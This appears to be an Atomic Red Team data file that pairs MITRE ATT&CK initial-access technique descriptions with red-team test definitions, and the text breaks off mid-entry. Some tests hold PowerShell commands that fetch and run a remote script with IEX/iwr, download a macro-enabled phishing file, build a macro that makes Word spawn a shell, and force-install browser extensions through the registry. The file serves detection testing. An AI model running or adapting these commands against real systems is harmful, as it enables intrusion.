initial-access:
  T1133:
    technique:
      modified: '2023-03-30T21:01:36.318Z'
      name: External Remote Services
      description: |-
        Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006) and [VNC](https://attack.mitre.org/techniques/T1021/005) can also be used externally.(Citation: MacOS VNC software for Remote Desktop)

        Access to [Valid Accounts](https://attack.mitre.org/techniques/T1078) to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network.(Citation: Volexity Virtual Private Keylogging) Access to remote services may be used as a redundant or persistent access mechanism during an operation.

        Access may also be gained through an exposed service that doesnâ€™t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard.(Citation: Trend Micro Exposed Docker Server)(Citation: Unit 42 Hildegard Malware)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: persistence
      - kill_chain_name: mitre-attack
        phase_name: initial-access
      x_mitre_attack_spec_version: 2.1.0
      x_mitre_contributors:
      - ExtraHop
      - David Fiser, @anu4is, Trend Micro
      - Alfredo Oliveira, Trend Micro
      - Idan Frimark, Cisco
      - Rory McCune, Aqua Security
      - Yuval Avrahami, Palo Alto Networks
      - Jay Chen, Palo Alto Networks
      - Brad Geesaman, @bradgeesaman
      - Magno Logan, @magnologan, Trend Micro
      - Ariel Shuper, Cisco
      - Yossi Weizman, Azure Defender Research Team
      - Vishwas Manral, McAfee
      - Daniel Oakley
      - Travis Smith, Tripwire
      - David Tayouri
      x_mitre_deprecated: false
      x_mitre_detection: |-
        Follow best practices for detecting adversary use of [Valid Accounts](https://attack.mitre.org/techniques/T1078) for authenticating to remote services. Collect authentication logs and analyze for unusual access patterns, windows of activity, and access outside of normal business hours.

        When authentication is not required to access an exposed remote service, monitor for follow-on activities such as anomalous external use of the exposed API or application.
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: false
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_platforms:
      - Windows
      - Linux
      - Containers
      - macOS
      x_mitre_version: '2.4'
      x_mitre_data_sources:
      - 'Logon Session: Logon Session Metadata'
      - 'Application Log: Application Log Content'
      - 'Network Traffic: Network Traffic Content'
      - 'Network Traffic: Network Traffic Flow'
      - 'Network Traffic: Network Connection Creation'
      type: attack-pattern
      id: attack-pattern--10d51417-ee35-4589-b1ff-b6df1c334e8d
      created: '2017-05-31T21:31:44.421Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1133
        external_id: T1133
      - source_name: Volexity Virtual Private Keylogging
        description: 'Adair, S. (2015, October 7). Virtual Private Keylogging: Cisco
          Web VPNs Leveraged for Access and Persistence. Retrieved March 20, 2017.'
        url: https://www.volexity.com/blog/2015/10/07/virtual-private-keylogging-cisco-web-vpns-leveraged-for-access-and-persistence/
      - source_name: MacOS VNC software for Remote Desktop
        description: Apple Support. (n.d.). Set up a computer running VNC software
          for Remote Desktop. Retrieved August 18, 2021.
        url: https://support.apple.com/guide/remote-desktop/set-up-a-computer-running-vnc-software-apdbed09830/mac
      - source_name: Unit 42 Hildegard Malware
        description: 'Chen, J. et al. (2021, February 3). Hildegard: New TeamTNT Cryptojacking
          Malware Targeting Kubernetes. Retrieved April 5, 2021.'
        url: https://unit42.paloaltonetworks.com/hildegard-malware-teamtnt/
      - source_name: Trend Micro Exposed Docker Server
        description: Remillano II, A., et al. (2020, June 20). XORDDoS, Kaiji Variants
          Target Exposed Docker Servers. Retrieved April 5, 2021.
        url: https://www.trendmicro.com/en_us/research/20/f/xorddos-kaiji-botnet-malware-variants-target-exposed-docker-servers.html
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      identifier: T1133
    atomic_tests:
    - name: Running Chrome VPN Extensions via the Registry 2 vpn extension
      auto_generated_guid: 4c8db261-a58b-42a6-a866-0a294deedde4
      description: 'Running Chrome VPN Extensions via the Registry install 2 vpn extension,
        please see "T1133\src\list of vpn extension.txt" to view complete list

        '
      supported_platforms:
      - windows
      input_arguments:
        chrome_url:
          description: chrome installer download URL
          type: url
          default: https://dl.google.com/tag/s/appguid%3D%7B8A69D345-D564-463C-AFF1-A69D9E530F96%7D%26iid%3D%7BFD62DDBC-14C6-20BD-706F-C7744738E422%7D%26lang%3Den%26browser%3D3%26usagestats%3D0%26appname%3DGoogle%2520Chrome%26needsadmin%3Dprefers%26ap%3Dx64-stable-statsdef_1%26installdataindex%3Dempty/chrome/install/ChromeStandaloneSetup64.exe
        extension_id:
          description: chrome extension id
          type: string
          default: '"fcfhplploccackoneaefokcmbjfbkenj", "fdcgdnkidjaadafnichfpabhfomcebme"

            '
      dependency_executor_name: powershell
      dependencies:
      - description: 'Chrome must be installed

          '
        prereq_command: if ((Test-Path "C:\Program Files\Google\Chrome\Application\chrome.exe")
          -Or (Test-Path "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"))
          {exit 0} else {exit 1}
        get_prereq_command: |
          Invoke-WebRequest -OutFile $env:temp\ChromeStandaloneSetup64.exe #{chrome_url}
          Start-Process $env:temp\ChromeStandaloneSetup64.exe /S
      executor:
        name: powershell
        elevation_required: true
        command: |
          $extList = #{extension_id}
          foreach ($extension in $extList) {
            New-Item -Path HKLM:\Software\Wow6432Node\Google\Chrome\Extensions\$extension -Force
            New-ItemProperty -Path "HKLM:\Software\Wow6432Node\Google\Chrome\Extensions\$extension" -Name "update_url" -Value "https://clients2.google.com/service/update2/crx" -PropertyType "String" -Force}
          Start chrome
          Start-Sleep -Seconds 30
          Stop-Process -Name "chrome"
        cleanup_command: |
          $extList = #{extension_id}
          foreach ($extension in $extList) {
          Remove-Item -Path "HKLM:\Software\Wow6432Node\Google\Chrome\Extensions\$extension" -ErrorAction Ignore}
  T1195.001:
    technique:
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      type: attack-pattern
      id: attack-pattern--191cc6af-1bb2-4344-ab5f-28e496638720
      created: '2020-03-11T14:13:42.916Z'
      x_mitre_version: '1.1'
      external_references:
      - source_name: mitre-attack
        external_id: T1195.001
        url: https://attack.mitre.org/techniques/T1195/001
      - source_name: Trendmicro NPM Compromise
        url: https://www.trendmicro.com/vinfo/dk/security/news/cybercrime-and-digital-threats/hacker-infects-node-js-package-to-steal-from-bitcoin-wallets
        description: Trendmicro. (2018, November 29). Hacker Infects Node.js Package
          to Steal from Bitcoin Wallets. Retrieved April 10, 2019.
      x_mitre_deprecated: false
      revoked: false
      description: "Adversaries may manipulate software dependencies and development
        tools prior to receipt by a final consumer for the purpose of data or system
        compromise. Applications often depend on external software to function properly.
        Popular open source projects that are used as dependencies in many applications
        may be targeted as a means to add malicious code to users of the dependency.(Citation:
        Trendmicro NPM Compromise)  \n\nTargeting may be specific to a desired victim
        set or may be distributed to a broad set of consumers but only move on to
        additional tactics on specific victims. "
      modified: '2022-04-28T16:03:59.172Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      name: Compromise Software Dependencies and Development Tools
      x_mitre_detection: 'Use verification of distributed binaries through hash checking
        or other integrity checking mechanisms. Scan downloads for malicious signatures
        and attempt to test software and updates prior to deployment while taking
        note of potential suspicious activity. '
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: initial-access
      x_mitre_is_subtechnique: true
      x_mitre_data_sources:
      - 'File: File Metadata'
      x_mitre_attack_spec_version: 2.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
    atomic_tests: []
  T1192:
    technique:
      x_mitre_platforms:
      - Windows
      - macOS
      - Linux
      - Office 365
      - SaaS
      x_mitre_domains:
      - enterprise-attack
      x_mitre_contributors:
      - Shailesh Tiwary (Indian Army)
      - Mark Wee
      - Jeff Sakowicz, Microsoft Identity Developer Platform Services (IDPM Services)
      - Saisha Agrawal, Microsoft Threat Intelligent Center (MSTIC)
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--20138b9d-1aac-4a26-8654-a36b6bbf2bba
      type: attack-pattern
      created: '2018-04-18T17:59:24.739Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: true
      external_references:
      - source_name: mitre-attack
        external_id: T1192
        url: https://attack.mitre.org/techniques/T1192
      - external_id: CAPEC-163
        source_name: capec
        url: https://capec.mitre.org/data/definitions/163.html
      - source_name: Trend Micro Pawn Storm OAuth 2017
        url: https://blog.trendmicro.com/trendlabs-security-intelligence/pawn-storm-abuses-open-authentication-advanced-social-engineering-attacks
        description: Hacquebord, F.. (2017, April 25). Pawn Storm Abuses Open Authentication
          in Advanced Social Engineering Attacks. Retrieved October 4, 2019.
      modified: '2020-03-02T19:21:35.153Z'
      name: Spearphishing Link
      description: "Spearphishing with a link is a specific variant of spearphishing.
        It is different from other forms of spearphishing in that it employs the use
        of links to download malware contained in email, instead of attaching malicious
        files to the email itself, to avoid defenses that may inspect email attachments.
        \n\nAll forms of spearphishing are electronically delivered social engineering
        targeted at a specific individual, company, or industry. In this case, the
        malicious emails contain links. Generally, the links will be accompanied by
        social engineering text and require the user to actively click or copy and
        paste a URL into a browser, leveraging [User Execution](https://attack.mitre.org/techniques/T1204).
        The visited website may compromise the web browser using an exploit, or the
        user will be prompted to download applications, documents, zip files, or even
        executables depending on the pretext for the email in the first place. Adversaries
        may also include links that are intended to interact directly with an email
        reader, including embedded images intended to exploit the end system directly
        or verify the receipt of an email (i.e. web bugs/web beacons). Links may also
        direct users to malicious applications  designed to [Steal Application Access
        Token](https://attack.mitre.org/techniques/T1528)s, like OAuth tokens, in
        order to gain access to protected applications and information.(Citation:
        Trend Micro Pawn Storm OAuth 2017)"
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: initial-access
      x_mitre_detection: |-
        URL inspection within email (including expanding shortened links) can help detect links leading to known malicious sites. Detonation chambers can be used to detect these links and either automatically go to these sites to determine if they're potentially malicious, or wait and capture the content if a user visits the link.

        Because this technique usually involves user interaction on the endpoint, many of the possible detections for Spearphishing Link take place once [User Execution](https://attack.mitre.org/techniques/T1204) occurs.
      x_mitre_version: '1.1'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_is_subtechnique: false
    atomic_tests: []
  T1566.002:
    technique:
      modified: '2023-04-11T00:44:21.193Z'
      name: Spearphishing Link
      description: |-
        Adversaries may send spearphishing emails with a malicious link in an attempt to gain access to victim systems. Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.

        All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging [User Execution](https://attack.mitre.org/techniques/T1204). The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place. Adversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly. Additionally, adversaries may use seemingly benign links that abuse special characters to mimic legitimate websites (known as an "IDN homograph attack").(Citation: CISA IDN ST05-016)

        Adversaries may also utilize links to perform consent phishing, typically with OAuth 2.0 request URLs that when accepted by the user provide permissions/access for malicious applications, allowing adversaries to  [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s.(Citation: Trend Micro Pawn Storm OAuth 2017) These stolen access tokens allow the adversary to perform various actions on behalf of the user via API calls. (Citation: Microsoft OAuth 2.0 Consent Phishing 2021)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: initial-access
      x_mitre_contributors:
      - Philip Winther
      - Shailesh Tiwary (Indian Army)
      - Mark Wee
      - Jeff Sakowicz, Microsoft Identity Developer Platform Services (IDPM Services)
      - Saisha Agrawal, Microsoft Threat Intelligent Center (MSTIC)
      - Kobi Haimovich, CardinalOps
      - Menachem Goldstein
      x_mitre_deprecated: false
      x_mitre_detection: |-
        URL inspection within email (including expanding shortened links) can help detect links leading to known malicious sites as well as links redirecting to adversary infrastructure based by upon suspicious OAuth patterns with unusual TLDs.(Citation: Microsoft OAuth 2.0 Consent Phishing 2021). Detonation chambers can be used to detect these links and either automatically go to these sites to determine if they're potentially malicious, or wait and capture the content if a user visits the link.

        Filtering based on DKIM+SPF or header analysis can help detect when the email sender is spoofed.(Citation: Microsoft Anti Spoofing)(Citation: ACSC Email Spoofing)

        Because this technique usually involves user interaction on the endpoint, many of the possible detections take place once [User Execution](https://attack.mitre.org/techniques/T1204) occurs.
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: true
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      - Office 365
      - SaaS
      - Google Workspace
      x_mitre_version: '2.4'
      x_mitre_data_sources:
      - 'Network Traffic: Network Traffic Flow'
      - 'Application Log: Application Log Content'
      - 'Network Traffic: Network Traffic Content'
      type: attack-pattern
      id: attack-pattern--2b742742-28c3-4e1b-bab7-8350d6300fa7
      created: '2020-03-02T19:15:44.182Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1566/002
        external_id: T1566.002
      - source_name: ACSC Email Spoofing
        description: Australian Cyber Security Centre. (2012, December). Mitigating
          Spoofed Emails Using Sender Policy Framework. Retrieved October 19, 2020.
        url: https://www.cyber.gov.au/sites/default/files/2019-03/spoof_email_sender_policy_framework.pdf
      - source_name: CISA IDN ST05-016
        description: 'CISA. (2019, September 27). Security Tip (ST05-016): Understanding
          Internationalized Domain Names. Retrieved October 20, 2020.'
        url: https://us-cert.cisa.gov/ncas/tips/ST05-016
      - source_name: Trend Micro Pawn Storm OAuth 2017
        description: Hacquebord, F.. (2017, April 25). Pawn Storm Abuses Open Authentication
          in Advanced Social Engineering Attacks. Retrieved October 4, 2019.
        url: https://blog.trendmicro.com/trendlabs-security-intelligence/pawn-storm-abuses-open-authentication-advanced-social-engineering-attacks
      - source_name: Microsoft OAuth 2.0 Consent Phishing 2021
        description: Microsoft 365 Defender Threat Intelligence Team. (2021, June
          14). Microsoft delivers comprehensive solution to battle rise in consent
          phishing emails. Retrieved December 13, 2021.
        url: https://www.microsoft.com/security/blog/2021/07/14/microsoft-delivers-comprehensive-solution-to-battle-rise-in-consent-phishing-emails/
      - source_name: Microsoft Anti Spoofing
        description: Microsoft. (2020, October 13). Anti-spoofing protection in EOP.
          Retrieved October 19, 2020.
        url: https://docs.microsoft.com/en-us/microsoft-365/security/office-365-security/anti-spoofing-protection?view=o365-worldwide
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
    atomic_tests: []
  T1566.001:
    technique:
      modified: '2023-03-30T21:01:42.995Z'
      name: 'Phishing: Spearphishing Attachment'
      description: "Adversaries may send spearphishing emails with a malicious attachment
        in an attempt to gain access to victim systems. Spearphishing attachment is
        a specific variant of spearphishing. Spearphishing attachment is different
        from other forms of spearphishing in that it employs the use of malware attached
        to an email. All forms of spearphishing are electronically delivered social
        engineering targeted at a specific individual, company, or industry. In this
        scenario, adversaries attach a file to the spearphishing email and usually
        rely upon [User Execution](https://attack.mitre.org/techniques/T1204) to gain
        execution. Spearphishing may also involve social engineering techniques, such
        as posing as a trusted source.\n\nThere are many options for the attachment
        such as Microsoft Office documents, executables, PDFs, or archived files.
        Upon opening the attachment (and potentially clicking past protections), the
        adversary's payload exploits a vulnerability or directly executes on the user's
        system. The text of the spearphishing email usually tries to give a plausible
        reason why the file should be opened, and may explain how to bypass system
        protections in order to do so. The email may also contain instructions on
        how to decrypt an attachment, such as a zip file password, in order to evade
        email boundary defenses. Adversaries frequently manipulate file extensions
        and icons in order to make attached executables appear to be document files,
        or files exploiting one application appear to be a file for a different one. "
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: initial-access
      x_mitre_contributors:
      - Philip Winther
      x_mitre_detection: |-
        Network intrusion detection systems and email gateways can be used to detect spearphishing with malicious attachments in transit. Detonation chambers may also be used to identify malicious attachments. Solutions can be signature and behavior based, but adversaries may construct attachments in a way to avoid these systems.

        Filtering based on DKIM+SPF or header analysis can help detect when the email sender is spoofed.(Citation: Microsoft Anti Spoofing)(Citation: ACSC Email Spoofing)

        Anti-virus can potentially detect malicious documents and attachments as they're scanned to be stored on the email server or on the user's computer. Endpoint sensing or network sensing can potentially detect malicious events once the attachment is opened (such as a Microsoft Word document or PDF reaching out to the internet or spawning Powershell.exe) for techniques such as [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203) or usage of malicious scripts.

        Monitor for suspicious descendant process spawning from Microsoft Office and other productivity software.(Citation: Elastic - Koadiac Detection with EQL)
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: true
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_platforms:
      - macOS
      - Windows
      - Linux
      x_mitre_version: '2.2'
      x_mitre_data_sources:
      - 'Network Traffic: Network Traffic Flow'
      - 'Application Log: Application Log Content'
      - 'File: File Creation'
      - 'Network Traffic: Network Traffic Content'
      type: attack-pattern
      id: attack-pattern--2e34237d-8574-43f6-aace-ae2915de8597
      created: '2020-03-02T19:05:18.137Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1566/001
        external_id: T1566.001
      - source_name: Microsoft Anti Spoofing
        description: Microsoft. (2020, October 13). Anti-spoofing protection in EOP.
          Retrieved October 19, 2020.
        url: https://docs.microsoft.com/en-us/microsoft-365/security/office-365-security/anti-spoofing-protection?view=o365-worldwide
      - source_name: ACSC Email Spoofing
        description: Australian Cyber Security Centre. (2012, December). Mitigating
          Spoofed Emails Using Sender Policy Framework. Retrieved October 19, 2020.
        url: https://www.cyber.gov.au/sites/default/files/2019-03/spoof_email_sender_policy_framework.pdf
      - source_name: Elastic - Koadiac Detection with EQL
        description: 'Stepanic, D.. (2020, January 13). Embracing offensive tooling:
          Building detections against Koadic using EQL. Retrieved November 30, 2020.'
        url: https://www.elastic.co/blog/embracing-offensive-tooling-building-detections-against-koadic-using-eql
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      identifier: T1566.001
    atomic_tests:
    - name: Download Macro-Enabled Phishing Attachment
      auto_generated_guid: 114ccff9-ae6d-4547-9ead-4cd69f687306
      description: |
        This atomic test downloads a macro enabled document from the Atomic Red Team GitHub repository, simulating an end user clicking a phishing link to download the file.
        The file "PhishingAttachment.xlsm" is downloaded to the %temp% directory.
      supported_platforms:
      - windows
      executor:
        command: |
          $url = 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1566.001/bin/PhishingAttachment.xlsm'
          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
          Invoke-WebRequest -Uri $url -OutFile $env:TEMP\PhishingAttachment.xlsm
        name: powershell
        cleanup_command: 'Remove-Item $env:TEMP\PhishingAttachment.xlsm -ErrorAction
          Ignore

          '
    - name: Word spawned a command shell and used an IP address in the command line
      auto_generated_guid: cbb6799a-425c-4f83-9194-5447a909d67f
      description: |
        Word spawning a command prompt then running a command with an IP address in the command line is an indicator of malicious activity.
        Upon execution, CMD will be launched and ping 8.8.8.8.
      supported_platforms:
      - windows
      input_arguments:
        jse_path:
          description: 'Path for the macro to write out the "malicious" .jse file

            '
          type: string
          default: C:\Users\Public\art.jse
        ms_product:
          description: Maldoc application Word or Excel
          type: string
          default: Word
      dependency_executor_name: powershell
      dependencies:
      - description: 'Microsoft #{ms_product} must be installed

          '
        prereq_command: |
          try {
            New-Object -COMObject "#{ms_product}.Application" | Out-Null
            $process = "#{ms_product}"; if ( $process -eq "Word") {$process = "winword"}
            Stop-Process -Name $process
            exit 0
          } catch { exit 1 }
        get_prereq_command: 'Write-Host "You will need to install Microsoft #{ms_product}
          manually to meet this requirement"

          '
      executor:
        command: |
          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
          $macrocode = "   Open `"#{jse_path}`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   Shell`$ `"ping 8.8.8.8`"`n"
          Invoke-MalDoc -macroCode $macrocode -officeProduct "#{ms_product}"
        cleanup_command: 'Remove-Item #{jse_path} -ErrorAction Ignore

          '
        name: powershell
  T1195.003:
    technique:
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      type: attack-pattern
      id: attack-pattern--39131305-9282-45e4-ac3b-591d2d4fc3ef
      created: '2020-03-11T14:28:40.064Z'
      x_mitre_version: '1.1'
      external_references:
      - source_name: mitre-attack
        external_id: T1195.003
        url: https://attack.mitre.org/techniques/T1195/003
      x_mitre_deprecated: false
      revoked: false
      description: Adversaries may manipulate hardware components in products prior
        to receipt by a final consumer for the purpose of data or system compromise.
        By modifying hardware or firmware in the supply chain, adversaries can insert
        a backdoor into consumer networks that may be difficult to detect and give
        the adversary a high degree of control over the system. Hardware backdoors
        may be inserted into various devices, such as servers, workstations, network
        infrastructure, or peripherals.
      modified: '2022-04-28T16:05:10.755Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      name: Compromise Hardware Supply Chain
      x_mitre_detection: Perform physical inspection of hardware to look for potential
        tampering. Perform integrity checking on pre-OS boot mechanisms that can be
        manipulated for malicious purposes.
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: initial-access
      x_mitre_is_subtechnique: true
      x_mitre_data_sources:
      - 'Sensor Health: Host Status'
      x_mitre_attack_spec_version: 2.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
    atomic_tests: []
  T1091:
    technique:
      modified: '2022-10-21T19:14:13.179Z'
      name: Replication Through Removable Media
      description: |-
        Adversaries may move onto systems, possibly those on disconnected or air-gapped networks, by copying malware to removable media and taking advantage of Autorun features when the media is inserted into a system and executes. In the case of Lateral Movement, this may occur through modification of executable files stored on removable media or by copying malware and renaming it to look like a legitimate file to trick users into executing it on a separate system. In the case of Initial Access, this may occur through manual manipulation of the media, modification of systems used to initially format the media, or modification to the media's firmware itself.

        Mobile devices may also be used to infect PCs with malware if connected via USB.(Citation: Exploiting Smartphone USB ) This infection may be achieved using devices (Android, iOS, etc.) and, in some instances, USB charging cables.(Citation: Windows Malware Infecting Android)(Citation: iPhone Charging Cable Hack) For example, when a smartphone is connected to a system, it may appear to be mounted similar to a USB-connected disk drive. If malware that is compatible with the connected system is on the mobile device, the malware could infect the machine (especially if Autorun features are enabled).
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: lateral-movement
      - kill_chain_name: mitre-attack
        phase_name: initial-access
      x_mitre_detection: Monitor file access on removable media. Detect processes
        that execute from removable media after it is mounted or when initiated by
        a user. If a remote access tool is used in this manner to move laterally,
        then additional actions are likely to occur after execution, such as opening
        network connections for Command and Control and system and network information
        Discovery.
      x_mitre_platforms:
      - Windows
      x_mitre_is_subtechnique: false
      x_mitre_deprecated: false
      x_mitre_domains:
      - enterprise-attack
      x_mitre_version: '1.2'
      x_mitre_contributors:
      - Joas Antonio dos Santos, @Cr4zyC0d3
      x_mitre_data_sources:
      - 'File: File Access'
      - 'File: File Creation'
      - 'Process: Process Creation'
      - 'Drive: Drive Creation'
      x_mitre_system_requirements:
      - Removable media allowed, Autorun enabled or vulnerability present that allows
        for code execution
      type: attack-pattern
      id: attack-pattern--3b744087-9945-4a6f-91e8-9dbceda417a4
      created: '2017-05-31T21:31:08.977Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1091
        external_id: T1091
      - source_name: Windows Malware Infecting Android
        description: Lucian Constantin. (2014, January 23). Windows malware tries
          to infect Android devices connected to PCs. Retrieved May 25, 2022.
        url: https://www.computerworld.com/article/2486903/windows-malware-tries-to-infect-android-devices-connected-to-pcs.html
      - source_name: iPhone Charging Cable Hack
        description: Zack Whittaker. (2019, August 12). This hackerâ€™s iPhone charging
          cable can hijack your computer. Retrieved May 25, 2022.
        url: https://techcrunch.com/2019/08/12/iphone-charging-cable-hack-computer-def-con/
      - source_name: 'Exploiting Smartphone USB '
        description: Zhaohui Wang & Angelos Stavrou. (n.d.). Exploiting Smart-Phone
          USB Connectivity For Fun And Profit. Retrieved May 25, 2022.
        url: https://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.226.3427&rep=rep1&type=pdf
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 2.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      identifier: T1091
    atomic_tests:
    - name: USB Malware Spread Simulation
      auto_generated_guid: d44b7297-622c-4be8-ad88-ec40d7563c75
      description: "Simulates an adversary copying malware to all connected removable
        drives. \n"
      supported_platforms:
      - windows
      executor:
        name: powershell
        command: |
          $RemovableDrives=@()
          $RemovableDrives = Get-WmiObject -Class Win32_LogicalDisk -filter "drivetype=2" | select-object -expandproperty DeviceID
          ForEach ($Drive in $RemovableDrives)
          {
          write-host "Removable Drive Found:" $Drive
          New-Item -Path $Drive/T1091Test1.txt -ItemType "file" -Force -Value "T1091 Test 1 has created this file to simulate malware spread to removable drives."
          }
        cleanup_command: |
          $RemovableDrives = Get-WmiObject -Class Win32_LogicalDisk -filter "drivetype=2" | select-object -expandproperty DeviceID
          ForEach ($Drive in $RemovableDrives)
          {
          Remove-Item -Path $Drive\T1091Test1.txt -Force -ErrorAction Ignore
          }
  T1195:
    technique:
      modified: '2023-03-30T21:01:42.446Z'
      name: Supply Chain Compromise
      description: "Adversaries may manipulate products or product delivery mechanisms
        prior to receipt by a final consumer for the purpose of data or system compromise.\n\nSupply
        chain compromise can take place at any stage of the supply chain including:\n\n*
        Manipulation of development tools\n* Manipulation of a development environment\n*
        Manipulation of source code repositories (public or private)\n* Manipulation
        of source code in open-source dependencies\n* Manipulation of software update/distribution
        mechanisms\n* Compromised/infected system images (multiple cases of removable
        media infected at the factory)(Citation: IBM Storwize)(Citation: Schneider
        Electric USB Malware) \n* Replacement of legitimate software with modified
        versions\n* Sales of modified/counterfeit products to legitimate distributors\n*
        Shipment interdiction\n\nWhile supply chain compromise can impact any component
        of hardware or software, adversaries looking to gain execution have often
        focused on malicious additions to legitimate software in software distribution
        or update channels.(Citation: Avast CCleaner3 2018)(Citation: Microsoft Dofoil
        2018)(Citation: Command Five SK 2011) Targeting may be specific to a desired
        victim set or malicious software may be distributed to a broad set of consumers
        but only move on to additional tactics on specific victims.(Citation: Symantec
        Elderwood Sept 2012)(Citation: Avast CCleaner3 2018)(Citation: Command Five
        SK 2011) Popular open source projects that are used as dependencies in many
        applications may also be targeted as a means to add malicious code to users
        of the dependency.(Citation: Trendmicro NPM Compromise)"
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: initial-access
      x_mitre_attack_spec_version: 2.1.0
      x_mitre_contributors:
      - Veeral Patel
      x_mitre_deprecated: false
      x_mitre_detection: Use verification of distributed binaries through hash checking
        or other integrity checking mechanisms. Scan downloads for malicious signatures
        and attempt to test software and updates prior to deployment while taking
        note of potential suspicious activity. Perform physical inspection of hardware
        to look for potential tampering.
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: false
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_platforms:
      - Linux
      - Windows
      - macOS
      x_mitre_version: '1.5'
      x_mitre_data_sources:
      - 'File: File Metadata'
      - 'Sensor Health: Host Status'
      type: attack-pattern
      id: attack-pattern--3f18edba-28f4-4bb9-82c3-8aa60dcac5f7
      created: '2018-04-18T17:59:24.739Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1195
        external_id: T1195
      - source_name: Avast CCleaner3 2018
        description: Avast Threat Intelligence Team. (2018, March 8). New investigations
          into the CCleaner incident point to a possible third stage that had keylogger
          capacities. Retrieved March 15, 2018.
        url: https://blog.avast.com/new-investigations-in-ccleaner-incident-point-to-a-possible-third-stage-that-had-keylogger-capacities
      - source_name: Command Five SK 2011
        description: Command Five Pty Ltd. (2011, September). SK Hack by an Advanced
          Persistent Threat. Retrieved April 6, 2018.
        url: https://www.commandfive.com/papers/C5_APT_SKHack.pdf
      - source_name: IBM Storwize
        description: IBM Support. (2017, April 26). Storwize USB Initialization Tool
